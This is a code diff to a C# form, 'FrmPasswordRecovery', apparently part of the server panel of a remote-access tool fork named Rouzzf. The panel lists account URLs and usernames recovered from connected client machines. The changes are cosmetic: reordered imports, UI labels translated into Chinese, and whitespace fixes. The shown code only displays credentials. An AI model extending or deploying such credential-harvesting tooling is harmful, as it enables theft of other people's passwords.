@@ -1,15 +1,15 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Text;
-using System.Windows.Forms;
-using Rouzzf.Common.Messages;
+﻿using Rouzzf.Common.Messages;
 using Rouzzf.Common.Models;
 using Rouzzf.Server.Helper;
 using Rouzzf.Server.Messages;
 using Rouzzf.Server.Models;
 using Rouzzf.Server.Networking;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
 
 namespace Rouzzf.Server.Forms
 {
@@ -85,7 +85,7 @@ namespace Rouzzf.Server.Forms
 
         private void FrmPasswordRecovery_Load(object sender, EventArgs e)
         {
-            this.Text = WindowHelper.GetWindowTitle("Password Recovery", _clients.Length);
+            this.Text = WindowHelper.GetWindowTitle("密码恢复", _clients.Length);
             txtFormat.Text = Settings.SaveFormat;
             RecoverPasswords();
         }
@@ -119,7 +119,7 @@ namespace Rouzzf.Server.Forms
                     if (lvg == null) // create new group
                     {
                         lvg = new ListViewGroup
-                            { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
+                        { Name = _noResultsFound.Application, Header = _noResultsFound.Application };
                         lstPasswords.Groups.Add(lvg); // add the new group
                     }
 
@@ -131,7 +131,7 @@ namespace Rouzzf.Server.Forms
                 var items = new List<ListViewItem>();
                 foreach (var acc in accounts)
                 {
-                    var lvi = new ListViewItem {Tag = acc, Text = clientIdentifier};
+                    var lvi = new ListViewItem { Tag = acc, Text = clientIdentifier };
 
                     lvi.SubItems.Add(acc.Url); // URL
                     lvi.SubItems.Add(acc.Username); // User
@@ -159,7 +159,7 @@ namespace Rouzzf.Server.Forms
 
         private void UpdateRecoveryCount()
         {
-            groupBox1.Text = $"Recovered Accounts [ {lstPasswords.Items.Count} ]";
+            groupBox1.Text = $"恢复账户 [ {lstPasswords.Items.Count} ]";
         }
 
         private string ConvertToFormat(string format, RecoveredAccount login)
@@ -204,7 +204,7 @@ namespace Rouzzf.Server.Forms
             }
             return lvg;
         }
-        
+
         #endregion
 
         #region Menu
